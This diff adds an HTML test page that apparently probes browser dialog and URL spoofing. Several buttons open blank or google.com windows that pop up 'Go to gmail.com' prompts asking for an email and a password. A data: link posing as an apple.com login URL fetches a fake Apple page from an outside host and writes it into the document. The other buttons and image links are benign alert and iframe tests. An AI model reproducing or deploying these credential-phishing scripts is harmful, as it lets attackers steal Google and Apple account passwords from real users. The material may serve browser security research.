@@ -1,0 +1,59 @@
+<script> function go(){ 
+ var x=window.open('about:blank'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
+  } 
+ </script> 
+
+<script> function go2(){ 
+ var x=window.open('https://google.com'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');b=x.prompt('Password','');x.alert('Welcome to Gmail.com');} ,1000);
+  } 
+ </script> 
+
+<script> function go3(){ 
+ var x=window.open('about:blank'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');} ,1000);
+  } 
+ </script> 
+
+<script> function twoAlert(){ 
+alert("This is the first alert!");
+alert("This is the second alert!");
+}
+ </script> 
+
+<script> function twoAlertDelay(){ 
+ setTimeout(function(){
+alert("This is the first alert!");
+alert("This is the second alert!");
+}, 5000);
+}
+ </script> 
+
+
+<script> function go4(){ 
+ var x=window.open('about:blank'); 
+ setTimeout(function(){
+ a=x.alert('Go to gmail.com');x.prompt('E-mail','');} ,1000);
+  } 
+ </script> 
+
+<button onclick="twoAlert()">two alerts</button>
+<button onclick="twoAlertDelay()">two alerts w/ delay</button>
+ <button onclick="go()">broken</button>
+<button onclick="go2()">not broken</button>
+<button onclick="go3()">just initial alert</button>
+<button onclick="go4()">initial alert and one prompt</button>
+
+<a href="data:application/javascript,www.apple.com/login?oauth=true&account&%0afetch(\'https://pwr.wtf/fakeapple.php\').then(r=%3E%7Br.text().then(w=%3E%7Bdocument.write(w)%7D)%7D)">test</a>
+<br><br>
+<a href="https://mattreagandev.com/images/topbar_matt_icon.png">PNG link</a><br><br>
+<a href="https://mattreagandev.com/images/topbar_matt_icon.png" target="_blank">PNG link new tab</a>
+<br><br>
+<a href="https://mattreagandev.com/images/topbar_matt_icon.png" target="imageFrame">PNG link iframe</a>
+<br><br>
+
+ <iframe name="imageFrame" width="300" height="300" style="border:1px solid black;"></iframe>
